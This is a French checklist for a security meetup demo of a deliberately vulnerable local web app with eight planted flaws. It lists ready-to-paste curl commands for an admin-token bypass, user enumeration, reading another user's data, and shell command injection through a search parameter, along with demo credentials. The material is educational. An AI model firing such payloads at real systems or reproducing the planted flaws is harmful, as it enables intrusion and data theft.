# ✅ CHECKLIST

**Vérifier 30 minutes avant la démo**

---

## 🚀 Setup

- [ ] Clone/pull le repo
- [ ] `npm install` terminé (439 packages)
- [ ] `npm start` lance sans erreur
- [ ] Accessible à http://localhost:3000

---

## 🧪 Tests Rapides

### Terminal 1: Serveur
```bash
cd /Users/kenkelvin/Documents/meetup
npm start
```

**Vérifier:**
- [ ] `Server running on port 3000` affiché
- [ ] Pas d'erreur dans les logs
- [ ] Reste stable pendant 2-3 minutes

### Terminal 2: Tests

```bash
cd /Users/kenkelvin/Documents/meetup
bash run-tests.sh
```

**Vérifier:**
- [ ] Server is running ✅
- [ ] Toutes les failles de 1 à 8 montrent ✅ success

---

## 🌐 Browser - Interface UI

1. Ouvrir http://localhost:3000 dans un browser propre
   - [ ] Page de login charge bien
   - [ ] Voir les 2 formulaires (Login / Register)
   - [ ] Les démos comptes visibles:
     - user@sneakers.com / user123
     - admin@sneakers.com / admin

2. Register un compte test
   - [ ] Formule register fonctionne
   - [ ] Pas de validation stricte (FAILLE 1) ✅

3. Login avec user@sneakers.com / user123
   - [ ] Redirection vers dashboard
   - [ ] [ ] Username affiché: "User: user"
   - [ ] Grille de 6 chaussures visible
   - [ ] Search box fonctionne
   - [ ] Logout button présent

---

## 🐚 Commandes Clés à Avoir Prêtes

**Terminal 3: Démo**

Avoir ces commandes copier/coller prêtes:

### Faille 4: Admin Bypass
```bash
curl -X POST http://localhost:3000/api/login \
  -H "X-Admin-Token: admin_token_12345" \
  -H "Content-Type: application/json" \
  -d '{"email":"anyone@example.com","password":"anything"}'
```
Résultat attendu: `"Admin access granted"`

### Faille 6: User Enumeration
```bash
# User exists - retourne "Wrong password"
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@sneakers.com","password":"wrong"}' | jq '.error'

# User doesn't exist - retourne "User not found"  
curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@example.com","password":"anything"}' | jq '.error'
```

### Faille 7: BFLA
```bash
# 1. Login et save cookies
curl -c cookies.txt -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@sneakers.com","password":"user123"}'

# 2. Access autre user
curl -b cookies.txt http://localhost:3000/api/user/2
```
Résultat: Voit le password d'admin!

### Faille 8: Command Injection
```bash
# Créer le cookie d'abord (cf. Faille 7 step 1)

# Injection
curl "http://localhost:3000/api/shoes/search?q=Nike;%20touch%20/tmp/pwned;%20echo" \
  -b cookies.txt

# Vérifier fichier créé
ls /tmp/pwned

# Cleanup
rm /tmp/pwned
```

---

## 📋 Fichiers Importants

- [README.md](README.md) - Explication des 8 failles
- [GUIDE.md](GUIDE.md) - Guide complet de démo avec timing
- [FIXES.md](FIXES.md) - Comment corriger chaque faille
- [server.js](server.js) - Code backend avec failles intégrées
- [public/login.html](public/login.html) - Interface login/register
- [public/dashboard.html](public/dashboard.html) - Dashboard avec produits

---

## 🎤 Pendant la Démo

### Structure (45 min)

| Partie | Temps |
|--------|-------|
| Intro + UI | 5 min |
| Faille 1-8 | 30 min (3-4 min par faille) |
| Config/Secrets | 2 min |
| Conclusion | 3 min |
| Q&A | 5 min |

### Points Clés à Couvrir

- [ ] **Intro:** "Vrai code + vrai failles + vrai interface"
- [ ] **Faille 1:** Pas de validation
- [ ] **Faille 2:** Plain text passwords
- [ ] **Faille 3:** Brute force rapide
- [ ] **Faille 4:** Admin bypass token
- [ ] **Faille 5:** Cookies non-sécurisés
- [ ] **Faille 6:** Énumération d'users
- [ ] **Faille 7:** Accès non-autorisé aux données
- [ ] **Faille 8:** RCE par command injection
- [ ] **Conclusion:** "La sécurité c'est un processus, pas une feature"

---

## 🆘 Troubleshooting

| Problème | Solution |
|----------|----------|
| Port 3000 occupé | `lsof -i :3000` puis `kill -9 <PID>` ou `PORT=3001 npm start` |
| npm install échoue | `rm -rf node_modules package-lock.json && npm install` |
| curl: command not found | `brew install curl` ou utiliser Postman |
| jq: command not found | `brew install jq` (pour les tests) |
| Page blanche au login | Ctrl+Shift+Delete cache ou ouvrir incognito |
| Cookies.txt pas créé | Vérifier la commande `curl -c cookies.txt` |

---

## 📊 Checklist Finale

- [ ] Serveur tourne sans erreur
- [ ] Interface UI fonctionne
- [ ] Login/Register/Dashboard complets
- [ ] Toutes les failles testées avec run-tests.sh
- [ ] Commandes clés prêtes à copier/coller
- [ ] README.md et GUIDE.md à porter
- [ ] Chrono réglé pour 45 min
- [ ] Q&A prêt (voir FIXES.md pour réponses)
- [ ] Backup du code sauvegardé
- [ ] Backup du repo en cas de problème Git

---

## 🎯 Timing Serré

**Timing critique:**
- Intro: max 2 min (pas de diversion)
- Faille par faille: 3-4 min max
- Config + Conclusion: 5 min max
- Q&A: 5-10 min

**Si ça traîne:**
- Passer des failles si nécessaire
- Sauter les détails de configuration
- Préparer réponses en 1-2 phrases

---

## 🆓 Après la Démo

- [ ] Partager README.md avec audience
- [ ] Pointer vers FIXES.md pour corrections
- [ ] Donner accès au repo GitHub
- [ ] Slack/Mail les ressources

---

**Bonne chance! 🚀**

*If in doubt, refer to GUIDE.md*
